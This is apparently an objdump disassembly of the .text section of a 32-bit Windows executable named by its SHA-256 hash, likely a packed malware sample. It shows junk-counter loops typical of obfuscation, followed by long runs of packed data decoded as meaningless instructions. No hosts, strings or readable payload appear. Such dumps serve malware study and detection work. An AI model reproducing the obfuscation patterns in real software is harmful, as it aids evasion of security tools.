
0e876ae536dc15efc9bc2b3d63117c43180eb6e6b5e2650ece69f64ac4113b80.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [ebx],al
  4011b8:	push   ebp
  4011b9:	jne    0x401179
  4011bb:	jle    0x40123b
  4011bd:	jle    0x40123d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    ecx,esp
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xd15cb73a
  40126d:	in     al,0xc6
  40126f:	ja     0x40129b
  401271:	sbb    eax,0x40b15cde
  401276:	xor    al,0x6c
  401278:	xchg   ebp,eax
  401279:	gs push 0xffffff93
  40127c:	mov    ds:0xc007085e,eax
  401281:	scas   eax,DWORD PTR es:[edi]
  401282:	ficomp WORD PTR [esi-0x3cb57138]
  401288:	push   es
  401289:	jne    0x401270
  40128b:	push   edi
  40128c:	mov    eax,ds:0xe13eb79
  401291:	xchg   edi,eax
  401293:	xor    eax,0xfdc1dc61
  401298:	shl    DWORD PTR [esi+edx*8-0x6f97b2cf],1
  40129f:	mov    bl,0x8
  4012a1:	dec    edi
  4012a2:	mov    al,ds:0x25aaee3f
  4012a7:	sub    esi,DWORD PTR gs:[eax-0x39]
  4012ab:	rcl    BYTE PTR [edi-0x53],1
  4012ae:	jmp    0xb1ebd942
  4012b3:	bound  eax,QWORD PTR [edi+ebx*1-0x6e]
  4012b7:	cmp    eax,0xedd0954e
  4012bc:	into   
  4012bd:	sub    eax,0x4385439
  4012c2:	cdq    
  4012c3:	or     edx,DWORD PTR [esi]
  4012c5:	xchg   esp,eax
  4012c6:	in     al,0x8e
  4012c8:	fisttp DWORD PTR [edi+0x2b251feb]
  4012ce:	and    BYTE PTR [ebp-0x7ca8d5f3],cl
  4012d4:	div    DWORD PTR [eax-0x2e]
  4012d7:	arpl   dx,ax
  4012d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012da:	jecxz  0x401265
  4012dc:	and    esi,DWORD PTR [ebp+0x41c999cc]
  4012e2:	fbld   TBYTE PTR [ecx+0x6b9451ed]
  4012e8:	adc    ah,BYTE PTR [ebx]
  4012ea:	mov    ch,0x9d
  4012ec:	add    bh,BYTE PTR [ebp+0x6f]
  4012ef:	xchg   dl,cl
  4012f1:	inc    edx
  4012f2:	mov    ebx,0x577a04be
  4012f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012f8:	je     0x4012ec
  4012fa:	xchg   esi,eax
  4012fb:	sti    
  4012fc:	cmp    al,ch
  4012fe:	retf   0xbcc7
  401301:	lds    edi,FWORD PTR [ebx]
  401303:	inc    edi
  401304:	xchg   esp,eax
  401305:	aad    0x7
  401307:	mov    eax,ds:0x4eaafc8c
  40130c:	adc    BYTE PTR [edx+0x3b],bl
  40130f:	xor    al,0x33
  401311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401312:	pop    edx
  401313:	dec    DWORD PTR ds:0xc4e2de3a
  401319:	add    esi,ebx
  40131b:	jnp    0x4012a2
  40131d:	mov    eax,ds:0x25672d39
  401322:	xchg   esi,eax
  401323:	in     al,0xf8
  401325:	jle    0x40137c
  401327:	jns    0x4012f2
  401329:	sbb    bh,BYTE PTR [edx]
  40132b:	push   esp
  40132c:	ret    0x4b57
  40132f:	xor    eax,0x6ec7bee5
  401334:	pusha  
  401335:	adc    al,0x28
  401337:	dec    ecx
  401338:	mov    ebx,0x6a00b6c8
  40133d:	out    0xcf,eax
  40133f:	adc    al,0xda
  401341:	or     BYTE PTR [eax],al
  401343:	fld    TBYTE PTR [edx+ecx*8+0x42]
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	nop
  4013b4:	adc    eax,0x7ffad3f1
  4013b9:	jle    0x401439
  4013bb:	cli    
  4013bc:	jg     0x40143c
  4013be:	jle    0x401357
  4013c0:	add    eax,0x88d92d64
  4013c5:	xchg   ah,ah
  4013c7:	(bad)  
  4013c8:	ja     0x40143d
  4013ca:	retf   
  4013cb:	push   eax
  4013cc:	inc    edi
  4013cd:	popf   
  4013ce:	pusha  
  4013cf:	imul   edi,DWORD PTR [edi-0x6f],0x6d
  4013d3:	mov    ebp,0x1ef7a220
  4013d8:	cs pop es
  4013da:	icebp  
  4013db:	push   ebp
  4013dc:	mov    BYTE PTR [eax-0x4],0x44
  4013e0:	inc    esp
  4013e1:	icebp  
  4013e2:	xor    DWORD PTR [ebx-0x7],0x38
  4013e6:	mov    fs,WORD PTR [ecx+0xd0dc7e7]
  4013ec:	fbstp  TBYTE PTR [ebx+0x5f]
  4013ef:	sar    edi,0x62
  4013f2:	jecxz  0x40138d
  4013f4:	inc    eax
  4013f5:	stc    
  4013f6:	int    0x2d
  4013f8:	sub    esi,edi
  4013fa:	adc    eax,0xf5e7e1c7
  4013ff:	or     bl,BYTE PTR [esi]
  401401:	xor    DWORD PTR ds:0x827b537c,ebx
  401407:	loope  0x401390
  401409:	push   DWORD PTR [ecx]
  40140b:	or     ecx,eax
  40140d:	mov    al,ds:0x9ec41288
  401412:	push   es
  401413:	and    DWORD PTR [esi-0x38],eax
  401416:	pop    ecx
  401417:	leave  
  401418:	fiadd  WORD PTR [esi+ebx*4+0x590f4832]
  40141f:	hlt    
  401420:	les    edi,FWORD PTR [ebx-0x61]
  401423:	mov    ?,WORD PTR [edi]
  401425:	ret    0x2437
  401428:	adc    eax,0x42
  40142b:	jmp    0xb2aa:0x754689d0
  401432:	sub    DWORD PTR [eax],ecx
  401434:	push   esp
  401435:	push   es
  401436:	inc    eax
  401437:	call   0xc423851c
  40143c:	(bad)  
  40143e:	pop    ss
  40143f:	lods   al,BYTE PTR ds:[esi]
  401440:	loope  0x4013db
  401442:	loope  0x401456
  401444:	inc    edi
  401445:	push   edx
  401446:	stos   BYTE PTR es:[edi],al
  401447:	adc    edx,DWORD PTR [edx+0x4c87d3eb]
  40144d:	dec    edi
  40144e:	cmp    eax,0xb44234e2
  401453:	les    eax,FWORD PTR [eax]
  401455:	es cmc 
  401457:	(bad)  
  401458:	or     eax,ecx
  40145a:	hlt    
  40145b:	scas   al,BYTE PTR es:[edi]
  40145c:	xchg   esp,eax
  40145d:	or     ebp,DWORD PTR [ecx-0x18f3761f]
  401463:	cmp    al,bl
  401465:	pop    edx
  401466:	fisubr WORD PTR [ebx+0x51f139e5]
  40146c:	push   ecx
  40146d:	inc    ebp
  40146e:	inc    edi
  40146f:	je     0x4014c5
  401471:	dec    esi
  401472:	shl    esi,1
  401474:	push   0x78870101
  401479:	jmp    0xf906f301
  40147e:	push   ebp
  40147f:	js     0x4014aa
  401481:	mov    ebx,0xad87088b
  401486:	imul   esi,DWORD PTR ds:0xb25d7f11,0xffffff9a
  40148d:	xchg   ecx,eax
  40148e:	xor    BYTE PTR [edi-0xc2abda3],cl
  401494:	es pusha 
  401496:	xchg   edi,eax
  401497:	xor    eax,0xaf47db28
  40149c:	xor    eax,0xfbc37848
  4014a1:	or     al,0xe4
  4014a3:	pushf  
  4014a4:	popa   
  4014a5:	adc    edi,DWORD PTR [ecx-0x62]
  4014a8:	je     0x40147b
  4014aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014ab:	loope  0x40148e
  4014ad:	fbld   TBYTE PTR [edi]
  4014af:	add    DWORD PTR [edi],esi
  4014b1:	add    esp,ebx
  4014b3:	lods   al,BYTE PTR ds:[esi]
  4014b4:	pop    ecx
  4014b5:	jns    0x401517
  4014b7:	leave  
  4014b8:	pop    ss
  4014b9:	mov    esp,0x7c6bf280
  4014be:	clc    
  4014bf:	or     al,0x66
  4014c1:	nop
  4014c2:	cwde   
  4014c3:	(bad)  
  4014c4:	xchg   ebp,eax
  4014c5:	adc    al,0x37
  4014c7:	push   esi
  4014c8:	cld    
  4014c9:	dec    ecx
  4014ca:	(bad)  
  4014cb:	mov    esp,0xaf07b254
  4014d0:	daa    
  4014d1:	test   BYTE PTR [ebp-0x23],bl
  4014d4:	out    0xdc,eax
  4014d6:	push   cs
  4014d7:	loope  0x4014db
  4014d9:	fist   WORD PTR [edx]
  4014db:	icebp  
  4014dc:	push   0x642030b2
  4014e1:	aaa    
  4014e2:	int    0xa1
  4014e4:	sub    ah,BYTE PTR ds:0xf358efc6
  4014ea:	sub    al,0x5d
  4014ec:	sub    eax,0x889f46cd
  4014f1:	inc    ebp
  4014f2:	add    esi,edx
  4014f4:	push   0x6e142dfe
  4014f9:	fldln2 
  4014fb:	jmp    0x480f:0xfb1549a2
  401502:	inc    esp
  401503:	loope  0x4014e6
  401505:	mov    ch,BYTE PTR [ecx+0x68796f6c]
  40150b:	arpl   WORD PTR [eax+0x2b],di
  40150e:	jg     0x401514
  401510:	lods   eax,DWORD PTR ds:[esi]
  401511:	fucom  st(1)
  401513:	mov    ebp,0x2c66d179
  401518:	xchg   edi,eax
  401519:	jno    0x401596
  40151b:	pop    ecx
  40151c:	inc    eax
  40151d:	fcmovbe st,st(1)
  40151f:	cwde   
  401520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401521:	rcl    ah,1
  401523:	mov    dl,0x7b
  401525:	push   ss
  401526:	push   esi
  401527:	cmp    dh,BYTE PTR [eax+0x5e]
  40152a:	jecxz  0x40155f
  40152c:	dec    eax
  40152d:	sar    DWORD PTR [esi],cl
  40152f:	sbb    al,0x59
  401531:	lods   al,BYTE PTR ds:[esi]
  401532:	xchg   esp,eax
  401533:	add    cl,cl
  401535:	add    BYTE PTR [ebx-0x6947e9c9],ah
  40153b:	je     0x4014f6
  40153d:	mov    dh,0xd5
  40153f:	fsubr  QWORD PTR [eax+0x11]
  401542:	xlat   BYTE PTR ds:[ebx]
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43360f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x358a011d]
  401564:	sbb    eax,DWORD PTR [esi]
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4014ff
  40156e:	pop    ds
  40156f:	mov    ds:0xdfa700ba,eax
  401574:	cmp    BYTE PTR [ecx],bh
  401576:	pop    ds
  401577:	sahf   
  401578:	xchg   edi,eax
  401579:	stos   BYTE PTR es:[edi],al
  40157a:	and    DWORD PTR [ebp+0x7],ebp
  40157d:	fcomi  st,st(1)
  40157f:	into   
  401580:	mul    BYTE PTR [ebp-0x5]
  401583:	xchg   esi,eax
  401584:	push   edi
  401585:	scas   eax,DWORD PTR es:[edi]
  401586:	cmc    
  401587:	not    BYTE PTR [edi-0x2a]
  40158a:	xor    bh,BYTE PTR [edx]
  40158c:	xchg   ecx,eax
  40158d:	iret   
  40158e:	adc    BYTE PTR [ecx],0xf8
  401591:	jns    0x401608
  401593:	cwde   
  401594:	(bad)
  401599:	das    
  40159a:	cs push ecx
  40159c:	mov    dl,0x9f
  40159e:	mov    ds:0x5a0d42d7,eax
  4015a3:	mov    ecx,0xab3dd66d
  4015a8:	push   edx
  4015a9:	scas   al,BYTE PTR es:[edi]
  4015aa:	ret    0xf028
  4015ad:	jne    0x40155c
  4015af:	add    ch,dl
  4015b1:	mov    bl,0xdf
  4015b3:	shr    bh,cl
  4015b5:	int    0xcf
  4015b7:	out    0xc,al
  4015b9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015bb:	push   ds
  4015bc:	pop    edx
  4015bd:	add    eax,0x96f69707
  4015c2:	ficom  DWORD PTR [edi]
  4015c4:	test   al,0x4d
  4015c6:	and    ch,0xaa
  4015c9:	mov    al,ds:0x90cd5dd
  4015ce:	mov    ebp,0xd6b5803b
  4015d3:	stos   DWORD PTR es:[edi],eax
  4015d4:	aam    0x2b
  4015d6:	xor    DWORD PTR [ecx],esi
  4015d8:	sti    
  4015d9:	jo     0x401580
  4015db:	in     al,dx
  4015dc:	push   ebx
  4015dd:	inc    esi
  4015de:	and    DWORD PTR ds:0xdb277428,esi
  4015e4:	(bad)  
  4015e5:	and    DWORD PTR [eax-0x33b65dbe],ecx
  4015eb:	clc    
  4015ec:	xor    al,0xa6
  4015ee:	outs   dx,DWORD PTR ds:[esi]
  4015ef:	or     BYTE PTR ds:0xe77a3ef1,ch
  4015f5:	lods   al,BYTE PTR ds:[esi]
  4015f6:	sub    al,0x12
  4015f8:	mov    cl,0x8
  4015fa:	je     0x40164c
  4015fc:	sub    eax,0x5122c763
  401601:	les    edi,FWORD PTR [edi+0x2a421030]
  401607:	test   DWORD PTR [edi+0x6e],esi
  40160a:	add    BYTE PTR [ecx+0x12723f6d],0xd9
  401611:	popf   
  401612:	mov    WORD PTR [edi-0x67],?
  401615:	scas   eax,DWORD PTR es:[edi]
  401616:	cmp    al,0xec
  401618:	mov    BYTE PTR [esi],0xa1
  40161b:	jno    0x4015a7
  40161d:	push   0x47
  40161f:	out    dx,al
  401620:	in     eax,dx
  401621:	jge    0x401631
  401623:	fwait
  401624:	mov    DWORD PTR [edx],edx
  401626:	mov    ecx,0x18c3e737
  40162b:	inc    edi
  40162c:	lea    edi,[edx]
  40162e:	rcr    BYTE PTR [eax-0x2e],cl
  401631:	(bad)  
  401632:	mov    ch,0xc3
  401634:	dec    esi
  401635:	jmp    DWORD PTR [ebp-0x1a33a6fa]
  40163b:	push   edx
  40163c:	fistp  WORD PTR [di]
  40163f:	jecxz  0x4015f7
  401641:	jle    0x401636
  401643:	fs jmp 0x3bfecc48
  401649:	mov    al,0x64
  40164b:	jle    0x401657
  40164d:	mov    bl,0x8a
  40164f:	daa    
  401650:	mov    edx,0xbbfa560a
  401655:	out    dx,eax
  401656:	jmp    ebx
  401658:	mov    esi,DWORD PTR [ebx+esi*8]
  40165b:	or     al,0xc1
  40165d:	lods   al,BYTE PTR ds:[esi]
  40165e:	adc    al,0x4f
  401660:	into   
  401661:	and    al,0x92
  401663:	cmp    BYTE PTR ds:0x2ef009dd,bh
  401669:	mov    ds:0x759f3c45,al
  40166e:	pop    edi
  40166f:	sahf   
  401670:	inc    ecx
  401671:	jg     0x4016be
  401673:	je     0x4016bb
  401675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401676:	dec    esp
  401677:	mov    al,0x99
  401679:	mov    ?,WORD PTR [ecx-0x74d4eb5a]
  40167f:	test   BYTE PTR [ebx],0xbc
  401682:	lock cld 
  401684:	add    al,0xef
  401686:	xor    al,0xc7
  401688:	es cmp eax,0xbfab45f2
  40168e:	mov    ecx,0xa8ef2737
  401693:	das    
  401694:	bound  edi,QWORD PTR [eax]
  401696:	lea    ebx,[esi-0x39]
  401699:	push   DWORD PTR [edx]
  40169b:	pop    es
  40169c:	or     ebp,edx
  40169e:	in     eax,0x84
  4016a0:	(bad)  
  4016a1:	and    ebp,DWORD PTR [ecx-0x4135fd24]
  4016a7:	adc    ch,BYTE PTR [edx+ecx*2+0x2b0b4960]
  4016ae:	fdiv   st,st(7)
  4016b0:	(bad)  
  4016b1:	in     eax,dx
  4016b2:	inc    ebp
  4016b3:	push   cs
  4016b4:	cdq    
  4016b5:	sbb    cl,BYTE PTR [esi]
  4016b7:	call   0xa4acfdae
  4016bc:	out    0x66,eax
  4016be:	and    al,0xd2
  4016c0:	ret    0xce5
  4016c3:	(bad)  
  4016c4:	cld    
  4016c5:	loop   0x4016e3
  4016c7:	sti    
  4016c8:	(bad)  
  4016c9:	repz push 0xbc143a8a
  4016cf:	dec    ebx
  4016d0:	addr16 pop ebp
  4016d2:	fsubrp st(4),st
  4016d4:	xchg   edi,eax
  4016d5:	sub    BYTE PTR es:[ebx-0x69f07d7e],bh
  4016dc:	push   esp
  4016dd:	mov    WORD PTR [ecx-0x38ed01ee],es
  4016e3:	fld    TBYTE PTR [esi]
  4016e5:	mov    cl,0xa3
  4016e7:	sub    cl,BYTE PTR [ebx]
  4016e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016ea:	leave  
  4016eb:	dec    edi
  4016ec:	aad    0x1f
  4016ee:	pop    edi
  4016ef:	mov    eax,ds:0x89c703c2
  4016f4:	inc    ebp
  4016f5:	int3   
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x75106ade
  4018e9:	mov    ds:0x7e7a82ed,eax
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x40191c
  4018f4:	jns    0x401889
  4018f6:	sub    al,0x7b
  4018f8:	cmp    al,0x4b
  4018fa:	and    cl,BYTE PTR [ebp+0x6e5afd2c]
  401900:	add    edi,esp
  401902:	jae    0x401897
  401904:	popf   
  401905:	cmp    ecx,DWORD PTR ds:0x75c0f78e
  40190b:	cmp    ebp,ebp
  40190d:	cmp    ch,BYTE PTR [eax]
  40190f:	dec    edi
  401910:	retf   
  401911:	cmp    al,bh
  401913:	imul   edi
  401915:	popf   
  401916:	jmp    0x6de2:0x9e7c32d
  40191d:	mov    bh,0x1f
  40191f:	imul   dh
  401921:	stos   DWORD PTR es:[edi],eax
  401922:	and    edi,DWORD PTR [ebx-0x619a0c0e]
  401928:	cdq    
  401929:	fadd   DWORD PTR ds:0xa1e52c0b
  40192f:	mov    ah,0x24
  401931:	xor    al,0x99
  401933:	imul   ebx,DWORD PTR [esi-0x20848506],0x6b
  40193a:	and    DWORD PTR [ebx-0x67],0x59673dff
  401941:	add    dl,al
  401943:	pop    eax
  401944:	lods   eax,DWORD PTR ds:[esi]
  401945:	bound  edi,QWORD PTR [edi-0x1c0057be]
  40194b:	jne    0x40197d
  40194d:	xor    al,0x3a
  40194f:	out    0x71,eax
  401951:	push   eax
  401952:	gs push 0x354ff0bb
  401958:	test   al,0x75
  40195a:	fsub   QWORD PTR [eax+0x73a14797]
  401960:	inc    esp
  401961:	mov    ds:0x312d4966,eax
  401966:	das    
  401967:	in     eax,dx
  401968:	mov    edx,0xdbdfd783
  40196d:	dec    ebx
  40196e:	or     eax,0x110c025
  401973:	sbb    al,0x57
  401975:	jg     0x401976
  401977:	iret   
  401978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401979:	fisub  WORD PTR [ebp-0x72274d1d]
